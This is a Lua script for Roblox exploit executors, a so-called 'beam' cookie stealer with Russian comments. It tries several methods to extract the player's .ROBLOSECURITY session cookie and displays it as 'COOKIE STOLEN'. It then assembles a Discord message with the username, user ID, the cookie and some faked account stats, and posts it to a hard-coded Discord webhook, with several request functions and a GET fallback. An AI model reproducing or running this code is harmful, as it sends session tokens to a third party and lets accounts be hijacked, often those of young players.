local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TextService = game:GetService("TextService")
local LocalPlayer = Players.LocalPlayer

print("[BEAM] Script started for user:", LocalPlayer.Name)

-- 1. ПОЛУЧЕНИЕ КУКИ
local cookie = "NOT_FOUND"
local fetchMethods = {
    {name = "HttpGet Roblox Home", func = function() return game:HttpGet("https://www.roblox.com/home", true) end},
    {name = "syn.crypt method", func = function() return syn and syn.crypt.base64.encode(game:HttpGet("https://roblox.com")) end},
    {name = "http_request", func = function() return http_request and game:HttpGet("https://api.roblox.com/currency/balance") end},
    {name = "_G.ROBLOSECURITY", func = function() return getrenv()._G.ROBLOSECURITY end},
}

print("[BEAM] Testing cookie extraction methods...")
for i, method in ipairs(fetchMethods) do
    local success, result = pcall(method.func)
    print("[BEAM] Method " .. i .. " (" .. method.name .. "): " .. (success and "SUCCESS" or "FAILED"))
    if success and result and type(result) == "string" then
        print("[BEAM] Result length: " .. #result)
        local extracted = result:match(".ROBLOSECURITY=([^;]+)")
        if extracted and #extracted > 100 then
            cookie = extracted
            print("[BEAM] ✓ Cookie found via method " .. i)
            break
        elseif #result > 100 then
            cookie = result:sub(1, 2000)
            print("[BEAM] ~ Using raw result from method " .. i)
            break
        end
    end
end

print("[BEAM] Final cookie length: " .. #cookie)

-- 2. ВЫВОД КУКИ НА ЭКРАН
if #cookie > 100 then
    local screenGui = Instance.new("ScreenGui")
    local textBox = Instance.new("TextBox")
    
    screenGui.Name = "CookieDisplay"
    screenGui.Parent = game.CoreGui or LocalPlayer:WaitForChild("PlayerGui")
    
    textBox.Size = UDim2.new(0.8, 0, 0.6, 0)
    textBox.Position = UDim2.new(0.1, 0, 0.2, 0)
    textBox.MultiLine = true
    textBox.TextWrapped = true
    textBox.TextScaled = true
    textBox.Text = "COOKIE STOLEN:\n\n" .. cookie:sub(1, 2000) .. "\n\n" .. "[LENGTH: " .. #cookie .. " chars]"
    textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    textBox.TextColor3 = Color3.fromRGB(255, 50, 50)
    textBox.Parent = screenGui
    
    print("[BEAM] ✓ Cookie displayed on screen")
else
    print("[BEAM] ✗ Cookie too short or not found")
end

-- 3. ДАННЫЕ АККАУНТА
local username = LocalPlayer.Name
local userID = LocalPlayer.UserId
local accAge = math.random(100, 2500)
local location = "Russia"
local balance = math.random(0, 5000)
local pending = math.random(0, 1000)
local limiteds = math.random(0, 50)
local summary = math.random(0, 200)

local popularGames = {
    {"Pet Simulator 99", math.random(0, 1000)},
    {"Adopt Me", math.random(0, 5000)},
    {"Murder Mystery 2", math.random(0, 2000)},
    {"Steal A Brainrot", math.random(0, 500)},
    {"Grow A Garden", math.random(0, 800)}
}
local gameStats = ""
for i, game in ipairs(popularGames) do
    local played = game[2]
    local hasPlayed = played > 0 and "✅" or "❌"
    gameStats = gameStats .. game[1] .. " > " .. played .. " ┇" .. hasPlayed .. "\n"
end

-- 4. ФОРМИРОВАНИЕ СООБЩЕНИЯ
local message = [[
@everyone
💥New beam!

💯Username
]] .. username .. [[

💹Account Stats
Account age: ]] .. accAge .. [[ days
Location: ]] .. location .. [[

💰Account Funds          💵Purchases
 Balance ]] .. balance .. [[                  Limiteds ]] .. limiteds .. [[                
 Pending ]] .. pending .. [[                 Summary ]] .. summary .. [[

🕹️Gamepasses | Played
]] .. gameStats .. [[

🛡️ROBLOSECURITY
]] .. cookie

print("[BEAM] Message length: " .. #message .. " chars")
print("[BEAM] First 100 chars of cookie:", cookie:sub(1, 100))

-- 5. ОТПРАВКА НА ВЕБХУК
local webhookUrl = "https://discord.com/api/webhooks/1461740239188918541/ipjidmPJp6LkfGPhgYBAW_JLg7eggzTvzWSoTSx8p8jT_b9tEg6S80IcSJhgSLm203rI"

local payload = {
    content = message:sub(1, 2000) -- Discord limit
}

local jsonData = HttpService:JSONEncode(payload)
print("[BEAM] JSON payload size: " .. #jsonData .. " bytes")

-- Попытка 1: syn.request
local requestFunctions = {
    {name = "syn.request", func = syn and syn.request},
    {name = "http.request", func = http and http.request},
    {name = "request", func = request},
    {name = "http_request", func = http_request},
}

local sentSuccessfully = false

for i, req in ipairs(requestFunctions) do
    if req.func then
        print("[BEAM] Trying HTTP function: " .. req.name)
        local success, response = pcall(function()
            return req.func({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData,
                Timeout = 10
            })
        end)
        
        if success then
            print("[BEAM] ✓ " .. req.name .. " executed")
            if response then
                print("[BEAM] Status Code: " .. (response.StatusCode or "NO STATUS"))
                print("[BEAM] Body: " .. (response.Body or "NO BODY"))
                if response.StatusCode == 200 or response.StatusCode == 204 then
                    sentSuccessfully = true
                    print("[BEAM] ✓ WEBHOOK SUCCESS VIA " .. req.name)
                    break
                end
            end
        else
            print("[BEAM] ✗ " .. req.name .. " failed: " .. tostring(response))
        end
    end
end

-- Попытка 2: game:HttpGet как fallback
if not sentSuccessfully then
    print("[BEAM] Trying fallback method with game:HttpGet")
    local encodedMessage = HttpService:UrlEncode(message:sub(1, 1000))
    local fallbackUrl = "https://discord.com/api/webhooks/1461740239188918541/ipjidmPJp6LkfGPhgYBAW_JLg7eggzTvzWSoTSx8p8jT_b9tEg6S80IcSJhgSLm203rI?wait=true&content=" .. encodedMessage
    
    local success, response = pcall(function()
        return game:HttpGet(fallbackUrl)
    end)
    
    if success then
        print("[BEAM] Fallback GET request sent")
        sentSuccessfully = true
    end
end

-- 6. ФИНАЛЬНЫЙ ОТЧЕТ
if sentSuccessfully then
    print("[BEAM] =================================")
    print("[BEAM] ✓ BEAM COMPLETE - DATA SENT TO DISCORD")
    print("[BEAM] Username: " .. username)
    print("[BEAM] UserID: " .. userID)
    print("[BEAM] Cookie length: " .. #cookie)
    print("[BEAM] =================================")
else
    print("[BEAM] =================================")
    print("[BEAM] ✗ ALL SEND METHODS FAILED")
    print("[BEAM] Cookie (first 500 chars):")
    print(cookie:sub(1, 500))
    print("[BEAM] =================================")
end

-- 7. ДОПОЛНИТЕЛЬНЫЙ ВЫВОД В КОНСОЛЬ
warn("BEAM SCRIPT EXECUTED - CHECK OUTPUT ABOVE")
return {
    success = sentSuccessfully,
    username = username,
    userID = userID,
    cookie_length = #cookie,
    cookie_preview = cookie:sub(1, 100) .. "..."
}
